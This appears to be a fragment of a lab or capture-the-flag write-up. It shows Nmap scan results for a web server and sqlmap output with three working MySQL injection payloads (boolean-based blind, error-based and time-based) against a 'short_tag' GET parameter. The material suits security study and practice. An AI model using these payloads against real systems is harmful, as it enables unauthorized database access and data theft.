# Nmap

```bash
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.9p1 (protocol 2.0)
80/tcp open  http    Apache httpd 2.4.62 ((Debian))
|_http-title: Image Grid
|_http-server-header: Apache/2.4.62 (Debian)
```

# sqlmap

``` bash
sqlmap identified the following injection point(s) with a total of 288 HTTP(s) requests:
---
Parameter: short_tag (GET)
    Type: boolean-based blind
    Title: OR boolean-based blind - WHERE or HAVING clause (MySQL comment)
    Payload: short_tag=-2147' OR 5242=5242#

    Type: error-based
    Title: MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)
    Payload: short_tag=' AND (SELECT 7692 FROM(SELECT COUNT(*),CONCAT(0x71766a6271,(SELECT (ELT(7692=7692,1))),0x7178626b71,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)-- oCqj

    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: short_tag=' AND (SELECT 7669 FROM (SELECT(SLEEP(5)))pqkF)-- ltNt
---
```

